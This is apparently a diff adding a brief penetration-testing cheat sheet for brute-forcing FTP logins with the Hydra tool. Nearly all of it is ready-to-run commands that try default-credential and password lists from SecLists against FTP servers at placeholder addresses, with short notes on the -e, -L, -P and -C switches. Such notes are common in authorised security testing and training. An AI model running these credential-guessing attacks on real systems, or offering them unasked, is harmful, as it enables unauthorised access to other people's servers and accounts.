@@ -1,1 +1,19 @@
+FTP
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt x.x.x.x ftp
+hydra -e nsr -C /usr/share/seclists/Passwords/Default-Credentials 10.11.x.x ftp
+hydra -e nsr -L username <IP address> ftp 
+
+The -e switch has three options, n, s, and r:
+    n: This option checks for a null password
+    s: This option is used for login name as password
+    r: This is the reverse of login name as password
+    - L: specify a list of usernames
+    - P: specify a list of passwords
+    -C: Colon separated file for username/password colon-seperated formatted files.
+    
+For FTP attack use this command
+    #hydra -l userlogin -P password-list-adress ftp://----IP--Address -V
+    
+FTP: 
+$ hydra -l admin -C /usr/share/seclists/Passwords/Default-Credentials 192.168.x.x ftp ← Good default cred list. 
 
